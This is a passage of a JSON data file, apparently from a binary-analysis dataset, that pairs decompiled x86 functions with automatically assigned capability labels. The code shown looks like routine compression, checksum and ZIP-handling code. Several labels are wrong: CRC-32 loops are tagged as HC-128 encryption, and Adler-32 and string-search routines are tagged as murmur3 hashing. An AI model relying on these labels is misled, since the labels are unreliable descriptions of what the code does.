    *piVar1 = *piVar1 + iVar4;\n                }\n                else if (uVar5 == 0) {\n                    if (iVar4 < 0xb) {\n                        *(arg_8h + 0xf38) = *(arg_8h + 0xf38) + 1;\n                    }\n                    else {\n                        *(arg_8h + 0xf3c) = *(arg_8h + 0xf3c) + 1;\n                    }\n                }\n                else {\n                    if (uVar5 != var_8h) {\n                        piVar1 = arg_8h + 0xef4 + uVar5 * 4;\n                        *piVar1 = *piVar1 + 1;\n                    }\n                    *(arg_8h + 0xf34) = *(arg_8h + 0xf34) + 1;\n                }\n                iVar4 = 0;\n                var_8h = uVar5;\n                if (uVar6 == 0) {\n                    iVar3 = 0x8a;\n                    iVar7 = 3;\n                }\n                else if (uVar5 == uVar6) {\n                    iVar3 = 6;\n                    iVar7 = 3;\n                }\n                else {\n                    iVar3 = 7;\n                    iVar7 = 4;\n                }\n            }\n            var_4h = var_4h + 2;\n            var_ch = var_ch + -1;\n            uVar5 = uVar6;\n        } while (var_ch != 0);\n    }\n    return;\n}\n",
        "token_count": 674
    },
    "004293b0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004293b0(uint16_t *arg_8h, int32_t arg_ch)\n\n{\n    uint16_t *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    uint arg_8h_00;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    puVar1 = arg_8h + 2;\n    iVar5 = 0;\n    var_4h = 0xffffffff;\n    iVar2 = 7;\n    iVar3 = 4;\n    if (*puVar1 == 0) {\n        iVar2 = 0x8a;\n        iVar3 = 3;\n    }\n    if (-1 < arg_ch) {\n        arg_8h = arg_8h + 6;\n        var_8h = arg_ch + 1;\n        uVar6 = *puVar1;\n        do {\n            uVar4 = *arg_8h;\n            iVar5 = iVar5 + 1;\n            if ((iVar2 <= iVar5) || (uVar6 != uVar4)) {\n                if (iVar5 < iVar3) {\n                    do {\n                        fcn.00429bb0(*(in_EAX + 0xef6 + uVar6 * 4));\n                        iVar5 = iVar5 + -1;\n                    } while (iVar5 != 0);\n                }\n                else {\n                    if (uVar6 == 0) {\n                        if (iVar5 < 0xb) {\n                            fcn.00429bb0(*(in_EAX + 0xf3a));\n                            arg_8h_00 = 3;\n                        }\n                        else {\n                            fcn.00429bb0(*(in_EAX + 0xf3e));\n                            arg_8h_00 = 7;\n                        }\n                    }\n                    else {\n                        if (uVar6 != var_4h) {\n                            fcn.00429bb0(*(in_EAX + 0xef6 + uVar6 * 4));\n                        }\n                        fcn.00429bb0(*(in_EAX + 0xf36));\n                        arg_8h_00 = 2;\n                    }\n                    fcn.00429bb0(arg_8h_00);\n                }\n                iVar5 = 0;\n                var_4h = uVar6;\n                if (uVar4 == 0) {\n                    iVar2 = 0x8a;\n                    iVar3 = 3;\n                }\n                else if (uVar6 == uVar4) {\n                    iVar2 = 6;\n                    iVar3 = 3;\n                }\n                else {\n                    iVar2 = 7;\n                    iVar3 = 4;\n                }\n            }\n            arg_8h = arg_8h + 2;\n            var_8h = var_8h + -1;\n            uVar6 = uVar4;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 669
    },
    "0040e8a0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040e8a0(uint *param_1)\n\n{\n    uint *puVar1;\n    uchar *puVar2;\n    int32_t iVar3;\n    int32_t **in_FS_OFFSET;\n    uint *var_8h;\n    uint32_t in_stack_00000018;\n    uint var_c14h;\n    uint var_c10h;\n    uint var_c0ch;\n    uint var_c08h;\n    uint var_c04h;\n    uint var_c00h;\n    uint var_bfch;\n    uint var_bf8h;\n    uint var_bf4h;\n    uint var_bd8h;\n    uint var_bd4h;\n    uint var_bd0h;\n    uint var_bcch;\n    uint var_7e4h;\n    uint var_3fch;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    uint uVar4;\n    uint *puVar5;\n    uint32_t noname_2;\n    char *noname_3;\n    uint in_stack_fffff3e8;\n    uint var_bd4h_2;\n    uint var_bd0h_2;\n    uint var_bcch_2;\n    uchar auStack2024 [1000];\n    uint var_3fch_2;\n    uchar uStack1020;\n    uchar uStack1019;\n    uint32_t uStack24;\n    int32_t *piStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack12 = 0x441608;\n    piStack16 = *in_FS_OFFSET;\n    uStack24 = *0x454664 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &piStack16;\n    uStack8 = 0;\n    *0x4576ec = 1;\n    fcn.00434d30();\n    var_bd0h_2._0_2_ = 0x3b;\n    puVar1 = var_8h;\n    if (in_stack_00000018 < 0x10) {\n        puVar1 = &param_1;\n    }\n    puVar2 = fcn.0042e17e(puVar1, &var_bd0h_2, &var_bd4h_2);\n    while (puVar2 != NULL) {\n        iVar3 = (**0x457418)();\n        if (5 < iVar3) {\n            fcn.00434d30();\n            fcn.00434d30();\n            iVar3 = (**0x457418)();\n            if (iVar3 < 0) {\n                var_3fch_2._0_1_ = 0;\n            }\n            else {\n                var_3fch_2._0_1_ = *puVar2;\n                var_3fch_2._1_1_ = puVar2[1];\n                var_3fch_2._2_1_ = puVar2[2];\n                var_3fch_2._3_1_ = puVar2[3];\n                uStack1020 = puVar2[4];\n                uStack1019 = 0;\n            }\n            puVar2 = puVar2 + 5;\n            puVar1 = &var_bcch_2;\n            (**0x4575cc)();\n            noname_3 = \"open_\";\n            puVar5 = &var_3fch_2;\n            iVar3 = (**0x457550)();\n            if (iVar3 == 0) {\n                uVar4 = 0x44c726;\n                noname_2 = puVar5 & 0xffffff00;\n                fcn.004090e0(0x44c726, 0);\n                fcn.00417e20(uVar4, iVar3, noname_2, noname_3, puVar1, puVar2);\n            }\n            else {\n                (**0x457520)();\n                puVar2 = fcn.0042d6d0(0x14);\n                *puVar2 = 0;\n                uVar4 = (**0x45758c)();\n                fcn.0042f3d4(uVar4);\n                iVar3 = 0x14;\n                do {\n                    fcn.0042f3e6();\n                    (**0x457374)();\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n                puVar2[0x14] = 0;\n                (**0x457520)();\n                (**0x457520)();\n                fcn.004175c0(auStack2024);\n                fcn.00434d30(&stack0xfffff3e8, 0);\n                in_stack_fffff3e8 = 0x3c;\n                (**0x457584)();\n            }\n            fcn.00434d30();\n            fcn.00434d30();\n            fcn.00434d30();\n            puVar2 = fcn.0042e17e(0, &var_bd0h_2, &var_bd4h_2);\n        }\n    }\n    *0x4576f4 = 1;\n    if (0xf < in_stack_00000018) {\n        fcn.0042d62b();\n    }\n    *in_FS_OFFSET = piStack16;\n    fcn.0042d636(in_stack_fffff3e8);\n    return;\n}\n",
        "token_count": 1183
    },
    "004110a0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.004110a0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint unaff_ESI;\n    uint uStackY125024;\n    uint uStackY125020;\n    uint uStackY125016;\n    uchar auStackY125012 [50000];\n    uchar auStackY75012 [65000];\n    uchar auStackY10012 [5000];\n    uint var_1390h;\n    uint uStackY52;\n    uint var_4h;\n    \n    fcn.0043c480();\n    uStackY125016 = 0;\n    fcn.00434d30();\n    fcn.00434d30();\n    fcn.00434d30();\n    fcn.00434d30();\n    fcn.00434d30();\n    (**0x457520)();\n    iVar1 = fcn.0042e17e(&stack0xfffedafc, 0x44eb74, &stack0xfffe17a4);\n    iVar2 = 1;\n    while (iVar1 != 0) {\n    // switch table (6 cases) at 0x4112fc\n        switch(iVar2) {\n        case 1:\n            fcn.00434d30();\n            (**0x457520)();\n            break;\n        case 2:\n            fcn.00434d30();\n            (**0x457520)();\n            break;\n        case 3:\n            fcn.00434d30();\n            (**0x457520)();\n            break;\n        case 4:\n            uStackY125024 = fcn.0042e323();\n            break;\n        case 5:\n            iVar1 = (**0x457550)();\n            if (iVar1 == 0) {\n                uStackY125020 = 1;\n                uStackY125016 = 999;\n            }\n            else {\n                iVar1 = (**0x457550)();\n                if (iVar1 == 0) {\n                    uStackY125020 = 0;\n                }\n                else {\n                    uStackY125020 = 1;\n                    uStackY125016 = fcn.0042e323();\n                }\n            }\n            break;\n        case 6:\n            fcn.00434d30();\n            (**0x457520)();\n            uStackY52 = 0x4112c3;\n            fcn.004106f0(&stack0xffffd8e4, uStackY125024, &fcn.004110a0::var_1390h, &stack0xfffe17ac, uStackY125020, \n                         uStackY125016);\n            iVar2 = 0;\n        }\n        iVar2 = iVar2 + 1;\n        iVar1 = fcn.0042e17e(0, 0x44eb74, &stack0xfffe17a4);\n    }\n    fcn.0042d636(unaff_ESI);\n    return;\n}\n",
        "token_count": 650
    },
    "0040bad0": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040bad0(uint8_t *param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if (param_1 == NULL) {\n        return 0;\n    }\n    uVar1 = ~in_EAX;\n    if (7 < param_2) {\n        uVar2 = param_2 >> 3;\n        do {\n            uVar1 = uVar1 >> 8 ^ *(((*param_1 ^ uVar1) & 0xff) * 4 + 0x44e3f0);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[1] ^ uVar1) & 0xff) * 4 + 0x44e3f0);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[2] ^ uVar1) & 0xff) * 4 + 0x44e3f0);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[3] ^ uVar1) & 0xff) * 4 + 0x44e3f0);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[4] ^ uVar1) & 0xff) * 4 + 0x44e3f0);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[5] ^ uVar1) & 0xff) * 4 + 0x44e3f0);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[6] ^ uVar1) & 0xff) * 4 + 0x44e3f0);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[7] ^ uVar1) & 0xff) * 4 + 0x44e3f0);\n            param_1 = param_1 + 8;\n            param_2 = param_2 - 8;\n            uVar2 = uVar2 - 1;\n        } while (uVar2 != 0);\n    }\n    for (; param_2 != 0; param_2 = param_2 - 1) {\n        uVar1 = uVar1 >> 8 ^ *(((*param_1 ^ uVar1) & 0xff) * 4 + 0x44e3f0);\n        param_1 = param_1 + 1;\n    }\n    return ~uVar1;\n}\n",
        "token_count": 580
    },
    "0042b0f0": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0042b0f0(uint8_t *param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if (param_1 == NULL) {\n        return 0;\n    }\n    uVar1 = ~in_EAX;\n    if (7 < param_2) {\n        uVar2 = param_2 >> 3;\n        do {\n            uVar1 = uVar1 >> 8 ^ *(((*param_1 ^ uVar1) & 0xff) * 4 + 0x44cac0);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[1] ^ uVar1) & 0xff) * 4 + 0x44cac0);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[2] ^ uVar1) & 0xff) * 4 + 0x44cac0);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[3] ^ uVar1) & 0xff) * 4 + 0x44cac0);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[4] ^ uVar1) & 0xff) * 4 + 0x44cac0);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[5] ^ uVar1) & 0xff) * 4 + 0x44cac0);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[6] ^ uVar1) & 0xff) * 4 + 0x44cac0);\n            uVar1 = uVar1 >> 8 ^ *(((param_1[7] ^ uVar1) & 0xff) * 4 + 0x44cac0);\n            param_1 = param_1 + 8;\n            param_2 = param_2 - 8;\n            uVar2 = uVar2 - 1;\n        } while (uVar2 != 0);\n    }\n    for (; param_2 != 0; param_2 = param_2 - 1) {\n        uVar1 = uVar1 >> 8 ^ *(((*param_1 ^ uVar1) & 0xff) * 4 + 0x44cac0);\n        param_1 = param_1 + 1;\n    }\n    return ~uVar1;\n}\n",
        "token_count": 564
    },
    "0040bc90": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040bc90(uint32_t arg_8h, uint8_t *arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    int32_t iVar16;\n    int32_t iVar17;\n    uint32_t uVar18;\n    \n    uVar2 = arg_8h & 0xffff;\n    arg_8h = arg_8h >> 0x10;\n    if (arg_ch == NULL) {\n        return 1;\n    }\n    if (arg_10h != 0) {\n        do {\n            uVar1 = arg_10h;\n            if (0x15af < arg_10h) {\n                uVar1 = 0x15b0;\n            }\n            arg_10h = arg_10h - uVar1;\n            if (0xf < uVar1) {\n                uVar18 = uVar1 >> 4;\n                uVar1 = uVar1 + uVar18 * -0x10;\n                do {\n                    iVar3 = uVar2 + *arg_ch;\n                    iVar4 = iVar3 + arg_ch[1];\n                    iVar5 = iVar4 + arg_ch[2];\n                    iVar6 = iVar5 + arg_ch[3];\n                    iVar7 = iVar6 + arg_ch[4];\n                    iVar8 = iVar7 + arg_ch[5];\n                    iVar9 = iVar8 + arg_ch[6];\n                    iVar10 = iVar9 + arg_ch[7];\n                    iVar11 = iVar10 + arg_ch[8];\n                    iVar12 = iVar11 + arg_ch[9];\n                    iVar13 = iVar12 + arg_ch[10];\n                    iVar14 = iVar13 + arg_ch[0xb];\n                    iVar15 = iVar14 + arg_ch[0xc];\n                    iVar16 = iVar15 + arg_ch[0xd];\n                    iVar17 = iVar16 + arg_ch[0xe];\n                    uVar2 = iVar17 + arg_ch[0xf];\n                    arg_8h = arg_8h + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11 + iVar12 +\n                             iVar13 + iVar14 + iVar15 + iVar16 + iVar17 + uVar2;\n                    arg_ch = arg_ch + 0x10;\n                    uVar18 = uVar18 - 1;\n                } while (uVar18 != 0);\n            }\n            for (; uVar1 != 0; uVar1 = uVar1 - 1) {\n                uVar2 = uVar2 + *arg_ch;\n                arg_ch = arg_ch + 1;\n                arg_8h = arg_8h + uVar2;\n            }\n            uVar2 = uVar2 % 0xfff1;\n            arg_8h = arg_8h % 0xfff1;\n        } while (arg_10h != 0);\n    }\n    return arg_8h << 0x10 | uVar2;\n}\n",
        "token_count": 744
    },
    "0042af40": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0042af40(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint32_t in_EAX;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0x50;\n    fcn.0042b670(&var_1h, 1);\n    var_1h._0_1_ = 0x4b;\n    fcn.0042b670(&var_1h, 1);\n    var_1h._0_1_ = 5;\n    fcn.0042b670(&var_1h, 1);\n    var_1h._0_1_ = 6;\n    fcn.0042b670(&var_1h, 1);\n    var_1h._0_1_ = 0;\n    fcn.0042b670(&var_1h, 1);\n    var_1h._0_1_ = 0;\n    fcn.0042b670(&var_1h, 1);\n    var_1h._0_1_ = 0;\n    fcn.0042b670(&var_1h, 1);\n    var_1h._0_1_ = 0;\n    fcn.0042b670(&var_1h, 1);\n    var_1h._0_1_ = arg_8h;\n    fcn.0042b670(&var_1h, 1);\n    uVar1 = arg_8h >> 8;\n    var_1h._0_1_ = uVar1;\n    fcn.0042b670(&var_1h, 1);\n    arg_8h = arg_8h & 0xffffff | arg_8h << 0x18;\n    fcn.0042b670(&arg_8h + 3, 1);\n    arg_8h = arg_8h & 0xffffff | uVar1 << 0x18;\n    fcn.0042b670(&arg_8h + 3, 1);\n    arg_8h = arg_8h & 0xffffff | arg_ch << 0x18;\n    fcn.0042b670(&arg_8h + 3, 1);\n    arg_8h = arg_8h & 0xffffff | (arg_ch >> 8) << 0x18;\n    fcn.0042b670(&arg_8h + 3, 1);\n    arg_8h = arg_8h & 0xffffff | (arg_ch >> 0x10) << 0x18;\n    fcn.0042b670(&arg_8h + 3, 1);\n    arg_8h = arg_ch & 0xff000000 | arg_8h & 0xffffff;\n    fcn.0042b670(&arg_8h + 3, 1);\n    arg_ch = arg_ch & 0xffffff | in_EAX << 0x18;\n    fcn.0042b670(&arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | (in_EAX >> 8) << 0x18;\n    fcn.0042b670(&arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff | (in_EAX >> 0x10) << 0x18;\n    fcn.0042b670(&arg_ch + 3, 1);\n    arg_ch = in_EAX & 0xff000000 | arg_ch & 0xffffff;\n    fcn.0042b670(&arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff;\n    fcn.0042b670(&arg_ch + 3, 1);\n    arg_ch = arg_ch & 0xffffff;\n    fcn.0042b670(&arg_ch + 3, 1);\n    return 0;\n}\n",
        "token_count": 917
    },
    "00434e30": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint32_t * fcn.00434e30(uint32_t *param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    char cVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    char cVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    char *pcVar9;\n    uint32_t *puVar10;\n    \n    cVar3 = *param_2;\n    if (cVar3 == '\\0') {\n        return param_1;\n    }\n    if (param_2[1] == '\\0') {\n        uVar4 = param_1 & 3;\n        while (uVar4 != 0) {\n            if (*param_1 == cVar3) {\n                return param_1;\n            }\n            if (*param_1 == '\\0') {\n                return NULL;\n            }\n            uVar4 = param_1 + 1 & 3;\n            param_1 = param_1 + 1;\n        }\n        while( true ) {\n            while( true ) {\n                uVar4 = *param_1;\n                uVar8 = uVar4 ^ CONCAT22(CONCAT11(cVar3, cVar3), CONCAT11(cVar3, cVar3));\n                uVar7 = uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff;\n                puVar10 = param_1 + 1;\n                if (((uVar8 ^ 0xffffffff ^ uVar8 + 0x7efefeff) & 0x81010100) != 0) break;\n                param_1 = puVar10;\n                if ((uVar7 & 0x81010100) != 0) {\n                    if ((uVar7 & 0x1010100) != 0) {\n                        return NULL;\n                    }\n                    if ((uVar4 + 0x7efefeff & 0x80000000) == 0) {\n                        return NULL;\n                    }\n                }\n            }\n            uVar4 = *param_1;\n            if (uVar4 == cVar3) {\n                return param_1;\n            }\n            if (uVar4 == '\\0') {\n                return NULL;\n            }\n            cVar6 = uVar4 >> 8;\n            if (cVar6 == cVar3) {\n                return param_1 + 1;\n            }\n            if (cVar6 == '\\0') break;\n            cVar6 = uVar4 >> 0x10;\n            if (cVar6 == cVar3) {\n                return param_1 + 2;\n            }\n            if (cVar6 == '\\0') {\n                return NULL;\n            }\n            cVar6 = uVar4 >> 0x18;\n            if (cVar6 == cVar3) {\n                return param_1 + 3;\n            }\n            param_1 = puVar10;\n            if (cVar6 == '\\0') {\n                return NULL;\n            }\n        }\n        return NULL;\n    }\n    do {\n        cVar6 = *param_1;\n        do {\n            while (puVar10 = param_1,  param_1 = puVar10 + 1,  cVar6 != cVar3) {\n                if (cVar6 == '\\0') {\n                    return NULL;\n                }\n                cVar6 = *param_1;\n            }\n            cVar6 = *param_1;\n            pcVar9 = param_2;\n            puVar5 = puVar10;\n        } while (cVar6 != param_2[1]);\n        do {\n            if (pcVar9[2] == '\\0') {\n                return puVar10;\n            }\n            if (*(puVar5 + 2) != pcVar9[2]) break;\n            pcVar1 = pcVar9 + 3;\n            if (*pcVar1 == '\\0') {\n                return puVar10;\n            }\n            pcVar2 = puVar5 + 3;\n            pcVar9 = pcVar9 + 2;\n            puVar5 = puVar5 + 2;\n        } while (*pcVar1 == *pcVar2);\n    } while( true );\n}\n",
        "token_count": 923
    },
    "0042b2f0": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0042b2f0(uint arg_8h)\n\n{\n    uint16_t *unaff_ESI;\n    uint16_t *unaff_EDI;\n    uint *arg_8h_00;\n    uint var_14h;\n    uint var_eh;\n    uint16_t var_ah;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    arg_8h_00 = &arg_8h;\n    (**0x4575b4)(arg_8h_00, &var_14h);\n    *unaff_ESI = ((CONCAT22(var_14h._2_2_, var_14h) + -0x3c) * 0x10 | var_14h._2_2_ & 0xf) << 5 | var_eh & 0x1f;\n    *unaff_EDI = (var_ah & 0x3f | CONCAT22(var_ah, var_eh._2_2_) << 6) << 5 | var_8h * 2 & 0x1fU;\n    fcn.0042d636(arg_8h_00);\n    return;\n}\n",
        "token_count": 292
    },
    "0042ba60": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0042ba60(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    int32_t arg_8h_00;\n    uint uVar2;\n    int32_t unaff_ESI;\n    ulong uVar3;\n    uint32_t var_38h;\n    int32_t var_34h;\n    uint32_t var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint var_18h;\n    uint var_12h;\n    uint var_eh;\n    uint32_t var_8h;\n    \n    var_8h = *0x454664 ^ &stack0xfffffffc;\n    *(unaff_ESI + 0x7c) = 0;\n    *(unaff_ESI + 0x84) = in_ECX;\n    *(unaff_ESI + 0x80) = 0;\n    *(unaff_ESI + 0x78) = 0;\n    *(unaff_ESI + 0x90) = 0;\n    *(unaff_ESI + 0x74) = 0;\n    *(unaff_ESI + 0x88) = arg_8h;\n    *(unaff_ESI + 0x8c) = 0;\n    if ((in_ECX != 0) && (arg_8h != 0)) {\n        *(unaff_ESI + 0x70) = arg_8h;\n        *(unaff_ESI + 0x4c) = 0x80000000;\n        *(unaff_ESI + 0x6c) = 1;\n        (**0x4574a8)(&var_28h);\n        (**0x4574c4)(&var_28h, &var_30h);\n        var_38h = var_30h;\n        var_34h = var_2ch;\n        (**0x4575b4)(&var_38h, &var_18h);\n        arg_8h_00 = (var_2ch + -0x19db1de) - (var_30h < 0xd53e8000);\n        uVar3 = fcn.00436c90(var_30h + 0x2ac18000, arg_8h_00, 10000000, 0);\n        uVar2 = uVar3 >> 0x20;\n        uVar1 = uVar3;\n        *(unaff_ESI + 0x50) = uVar1;\n        *(unaff_ESI + 0x58) = uVar1;\n        *(unaff_ESI + 0x60) = uVar1;\n        *(unaff_ESI + 0x5c) = uVar2;\n        *(unaff_ESI + 100) = uVar2;\n        *(unaff_ESI + 0x54) = uVar2;\n        *(unaff_ESI + 0x68) =\n             (((CONCAT22(var_18h._2_2_, var_18h) + -0x3c) * 0x10 & 0x7ffU | var_18h._2_2_ & 0xf) << 5 | var_12h & 0x1f)\n             << 0x10 | (var_eh & 0x3f | (var_12h._2_2_ & 0x1f) << 6) << 5 | var_eh._2_2_ * 2 & 0x1f;\n        fcn.0042d636(arg_8h_00);\n        return;\n    }\n    fcn.0042d636(var_38h);\n    return;\n}\n",
        "token_count": 852
    },
    "0042bb90": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0042bb90(void)\n\n{\n    uint uVar1;\n    int32_t arg_8h;\n    uint uVar2;\n    int32_t unaff_ESI;\n    ulong uVar3;\n    uint32_t var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_14h;\n    uint var_eh;\n    uint var_ah;\n    uint32_t var_4h;\n    \n    var_4h = *0x454664 ^ &stack0xfffffffc;\n    *(unaff_ESI + 0x7c) = 0;\n    *(unaff_ESI + 0x84) = 0;\n    *(unaff_ESI + 0x80) = 0;\n    *(unaff_ESI + 0x78) = 0;\n    *(unaff_ESI + 0x90) = 0;\n    *(unaff_ESI + 0x74) = 0;\n    *(unaff_ESI + 0x4c) = 0x41c00010;\n    *(unaff_ESI + 0x70) = 0;\n    *(unaff_ESI + 0x6c) = 0;\n    (**0x4574a8)(&var_24h);\n    (**0x4574c4)(&var_24h, &var_2ch);\n    var_34h = var_2ch;\n    var_30h = var_28h;\n    (**0x4575b4)(&var_34h, &var_14h);\n    arg_8h = (var_28h + -0x19db1de) - (var_2ch < 0xd53e8000);\n    uVar3 = fcn.00436c90(var_2ch + 0x2ac18000, arg_8h, 10000000, 0);\n    uVar2 = uVar3 >> 0x20;\n    uVar1 = uVar3;\n    *(unaff_ESI + 0x50) = uVar1;\n    *(unaff_ESI + 0x58) = uVar1;\n    *(unaff_ESI + 0x60) = uVar1;\n    *(unaff_ESI + 0x5c) = uVar2;\n    *(unaff_ESI + 100) = uVar2;\n    *(unaff_ESI + 0x54) = uVar2;\n    *(unaff_ESI + 0x68) =\n         (((CONCAT22(var_14h._2_2_, var_14h) + -0x3c) * 0x10 & 0x7ffU | var_14h._2_2_ & 0xf) << 5 | var_eh & 0x1f) <<\n         0x10 | (var_ah & 0x3f | (var_eh._2_2_ & 0x1f) << 6) << 5 | var_ah._2_2_ * 2 & 0x1f;\n    fcn.0042d636(arg_8h);\n    return;\n}\n",
        "token_count": 733
    },
    "0043d8d6": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17",
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid fcn.0043d8d6(void)\n\n{\n    uint8_t *puVar1;\n    int32_t unaff_EBP;\n    uint32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != unaff_EDI) {\n        if (*(unaff_EBP + -0x20) != unaff_EDI) {\n            puVar1 = *((*unaff_ESI >> 5) * 4 + 0x468060) + 4 + (*unaff_ESI & 0x1f) * 0x40;\n            *puVar1 = *puVar1 & 0xfe;\n        }\n        fcn.0043c6ba(*unaff_ESI);\n    }\n    return;\n}\n",
        "token_count": 192
    },
    "0040bbd0": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040bbd0(char param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(((param_1 ^ *param_2) & 0xff) * 4 + 0x44e3f0) ^ *param_2 >> 8;\n    *param_2 = uVar1;\n    uVar1 = ((uVar1 & 0xff) + param_2[1]) * 0x8088405 + 1;\n    param_2[1] = uVar1;\n    param_2[2] = param_2[2] >> 8 ^ *(((uVar1 >> 0x18 ^ param_2[2]) & 0xff) * 4 + 0x44e3f0);\n    return;\n}\n",
        "token_count": 189
    },
    "0040bc20": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\nvoid fcn.0040bc20(void)\n\n{\n    uint32_t uVar1;\n    uint8_t in_AL;\n    uint32_t uVar2;\n    uint32_t *unaff_ESI;\n    \n    uVar1 = unaff_ESI[2];\n    uVar2 = uVar1 & 0xfffd | 2;\n    uVar2 = *(((in_AL ^ (uVar2 ^ 1) * uVar2 >> 8 ^ *unaff_ESI) & 0xff) * 4 + 0x44e3f0) ^ *unaff_ESI >> 8;\n    *unaff_ESI = uVar2;\n    uVar2 = ((uVar2 & 0xff) + unaff_ESI[1]) * 0x8088405 + 1;\n    unaff_ESI[1] = uVar2;\n    unaff_ESI[2] = uVar1 >> 8 ^ *(((uVar2 >> 0x18 ^ uVar1) & 0xff) * 4 + 0x44e3f0);\n    return;\n}\n",
        "token_count": 245
    },
    "0041c910": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
